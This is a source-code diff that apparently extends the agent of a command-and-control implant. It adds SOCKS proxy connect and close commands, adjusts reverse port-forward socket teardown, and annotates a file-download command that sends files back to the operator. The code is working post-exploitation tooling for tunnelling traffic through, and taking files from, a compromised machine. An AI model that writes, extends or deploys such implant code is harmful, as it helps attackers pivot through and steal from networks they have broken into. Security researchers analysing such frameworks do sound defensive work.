@@ -794,7 +794,7 @@ VOID CommandFS( PPARSER Parser )
             PackageAddInt32( Package, Download->FileID   );
 
             /* Download Open Data */
-            PackageAddInt32( Package, FileSize );
+            PackageAddInt32( Package, FileSize ); /* TODO: change this to 64bit or else we can't download files larger than 4gb */
             if ( PathSize > 0 )
                 PackageAddBytes( Package, FilePath, PathSize * sizeof( WCHAR ) );
             else
@@ -2618,7 +2618,7 @@ VOID CommandSocket( PPARSER Parser )
 
                 if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD && Socket->ID == SocketID )
                 {
-                    Socket->Type = SOCKET_TYPE_REMOVED;
+                    Socket->Type = SOCKET_TYPE_CLIENT_REMOVED;
 
                     /* we don't want to send the message now.
                      * send it while we are free and closing the socket. */
@@ -2644,7 +2644,7 @@ VOID CommandSocket( PPARSER Parser )
                     break;
 
                 if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD )
-                    Socket->Type = SOCKET_TYPE_REMOVED;
+                    Socket->Type = SOCKET_TYPE_CLIENT_REMOVED;
 
                 Socket = Socket->Next;
             }
@@ -2660,6 +2660,7 @@ VOID CommandSocket( PPARSER Parser )
         case SOCKET_COMMAND_SOCKSPROXY_ADD: PUTS( "Socket::SocksProxyAdd" )
         {
             /* TODO: implement */
+
             break;
         }
 
@@ -2693,11 +2694,90 @@ VOID CommandSocket( PPARSER Parser )
 
                     /* destroy the package and exit this command function */
                     PackageDestroy( Package );
+
                     return;
                 }
 
                 Socket = Socket->Next;
             }
+
+            break;
+        }
+
+        case SOCKET_COMMAND_CONNECT: PUTS( "Socket::Connect" )
+        {
+            DWORD ScId = 0;
+            LPSTR Host = NULL;
+            DWORD Addr = 0;
+            DWORD Port = 0;
+
+            /* parse arguments */
+            ScId = ParserGetInt32( Parser );
+            Port = ParserGetInt32( Parser );
+            Addr = ParserGetInt32( Parser );
+            Host = ParserGetBytes( Parser, NULL );
+
+            /* check if its 0.0.0.1
+             * if it's an addr then query for the host.
+             * if not the use the addr to connect */
+            if ( ( ( Addr >> ( 8 * 3 ) ) & 0xff ) == 0x00 &&
+                 ( ( Addr >> ( 8 * 2 ) ) & 0xff ) == 0x00 &&
+                 ( ( Addr >> ( 8 * 1 ) ) & 0xff ) == 0x00 &&
+                 ( ( Addr >> ( 8 * 0 ) ) & 0xff ) == 0x1 )
+            {
+                /* query ip from specified host/domain */
+                Addr = DnsQueryIP( Host );
+            }
+
+            /* check if address is not 0 */
+            if ( Addr )
+            {
+                /* Create a socks proxy socket and insert it into the linked list. */
+                if ( ( Socket = SocketNew( NULL, SOCKET_TYPE_REVERSE_PROXY, HTONS32( Addr ), Port, 0, 0 ) ) )
+                    Socket->ID = ScId;
+
+                PackageAddInt32( Package, Socket ? TRUE : FALSE );
+            }
+            else PackageAddInt32( Package, FALSE );
+
+            PackageAddInt32( Package, ScId );
+
+            break;
+        }
+
+        case SOCKET_COMMAND_CLOSE: PUTS( "Socket::Close" )
+        {
+            DWORD SocketID = 0;
+
+            /* parse arguments */
+            SocketID = ParserGetInt32( Parser );
+
+            /* get Sockets list */
+            Socket = Instance.Sockets;
+
+            for ( ;; )
+            {
+                if ( ! Socket )
+                    break;
+
+                if ( Socket->ID == SocketID )
+                {
+                    PRINTF( "Found socket: %x\n", Socket->ID )
+
+                    Socket->Type = ( Socket->Type == SOCKET_TYPE_CLIENT ) ?
+                                   SOCKET_TYPE_CLIENT_REMOVED :
+                                   SOCKET_TYPE_SOCKS_REMOVED  ;
+
+                    /* destroy the package and exit this command function */
+                    PackageDestroy( Package );
+
+                    return;
+                }
+
+                Socket = Socket->Next;
+            }
+
+            break;
         }
 
         default: break;
